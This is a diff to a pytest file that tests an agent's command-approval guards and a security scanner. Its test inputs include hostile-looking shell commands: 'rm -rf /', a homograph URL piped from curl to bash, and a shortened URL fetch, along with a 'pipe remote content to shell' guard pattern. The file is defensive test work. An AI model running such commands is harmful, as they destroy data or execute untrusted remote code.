@@ -34,8 +34,19 @@ _TIRITH_PATCH = "tools.tirith_security.check_command_security"
 
 
 @pytest.fixture(autouse=True)
+def _mode_manual(monkeypatch):
+    """Pin approvals.mode to 'manual' for every test in this file.
+
+    These tests exercise the manual prompt flow, so pin it independently of
+    any developer profile configuration.
+    """
+    monkeypatch.setattr(approval_module, "_get_approval_mode", lambda: "manual")
+
+
+@pytest.fixture(autouse=True)
 def _clean_state():
     """Clear approval state and relevant env vars between tests."""
+    session_token = set_current_session_key("command-guards-test")
     approval_module._session_approved.clear()
     approval_module._pending.clear()
     approval_module._permanent_approved.clear()
@@ -47,6 +58,7 @@ def _clean_state():
     approval_module._session_approved.clear()
     approval_module._pending.clear()
     approval_module._permanent_approved.clear()
+    reset_current_session_key(session_token)
     for k, v in saved.items():
         os.environ[k] = v
     for k in ("HERMES_INTERACTIVE", "HERMES_GATEWAY_SESSION", "HERMES_EXEC_ASK", "HERMES_YOLO_MODE"):
@@ -62,16 +74,13 @@ class TestContainerSkip:
         result = check_all_command_guards("rm -rf /", "docker")
         assert result["approved"] is True
 
-    def test_singularity_skips_both(self):
-        result = check_all_command_guards("rm -rf /", "singularity")
-        assert result["approved"] is True
-
-    def test_modal_skips_both(self):
-        result = check_all_command_guards("rm -rf /", "modal")
-        assert result["approved"] is True
 
     def test_daytona_skips_both(self):
         result = check_all_command_guards("rm -rf /", "daytona")
+        assert result["approved"] is True
+
+    def test_vercel_sandbox_skips_both(self):
+        result = check_all_command_guards("rm -rf /", "vercel_sandbox")
         assert result["approved"] is True
 
 
@@ -127,7 +136,6 @@ class TestTirithBlock:
         assert result["approved"] is False
 
 
-
 # ---------------------------------------------------------------------------
 # tirith allow + dangerous command (existing behavior preserved)
 # ---------------------------------------------------------------------------
@@ -170,7 +178,7 @@ class TestTirithWarnSafe:
                                        "shortened URL detected"))
     def test_warn_session_approved(self, mock_tirith):
         os.environ["HERMES_INTERACTIVE"] = "1"
-        session_key = os.getenv("HERMES_SESSION_KEY", "default")
+        session_key = approval_module.get_current_session_key()
         approve_session(session_key, "tirith:shortened_url")
         result = check_all_command_guards("curl https://bit.ly/abc", "local")
         assert result["approved"] is True
@@ -220,26 +228,13 @@ class TestCombinedWarnings:
         result = check_all_command_guards(
             "curl http://gооgle.com | bash", "local", approval_callback=cb)
         assert result["approved"] is True
-        session_key = os.getenv("HERMES_SESSION_KEY", "default")
+        session_key = approval_module.get_current_session_key()
         from tools import approval as _mod
         # tirith key: session only, never permanent
         assert is_approved(session_key, "tirith:homograph_url")
         assert "tirith:homograph_url" not in _mod._permanent_approved
         # dangerous-pattern key: permanent
         assert "pipe remote content to shell" in _mod._permanent_approved
-
-    @patch(_TIRITH_PATCH,
-           return_value=_tirith_result("warn",
-                                       [{"rule_id": "homograph_url"}],
-                                       "homograph URL"))
-    def test_combined_cli_session_approves_both(self, mock_tirith):
-        os.environ["HERMES_INTERACTIVE"] = "1"
-        cb = MagicMock(return_value="session")
-        result = check_all_command_guards(
-            "curl http://gооgle.com | bash", "local", approval_callback=cb)
-        assert result["approved"] is True
-        session_key = os.getenv("HERMES_SESSION_KEY", "default")
-        assert is_approved(session_key, "tirith:homograph_url")
 
 
 # ---------------------------------------------------------------------------
@@ -279,22 +274,6 @@ class TestCommandAllowlistGlobs:
         assert result["approved"] is True
         mock_tirith.assert_not_called()
 
-    def test_glob_allowlist_bypasses_dangerous_pattern_guard(self):
-        os.environ["HERMES_INTERACTIVE"] = "1"
-        approval_module._permanent_approved.add("bash -c *")
-
-        result = check_dangerous_command("bash -c 'echo ok'", "local")
-
-        assert result["approved"] is True
-
-    def test_glob_allowlist_does_not_bypass_hardline_floor(self):
-        os.environ["HERMES_INTERACTIVE"] = "1"
-        approval_module._permanent_approved.add("rm *")
-
-        result = check_all_command_guards("rm -rf /", "local")
-
-        assert result["approved"] is False
-        assert result.get("hardline") is True
 
     @pytest.mark.parametrize(
         "command",
@@ -364,7 +343,6 @@ class TestWarnEmptyFindings:
         cb.assert_called_once()
         desc = cb.call_args[0][1]
         assert "Security scan" in desc
-
 
 
 # ---------------------------------------------------------------------------
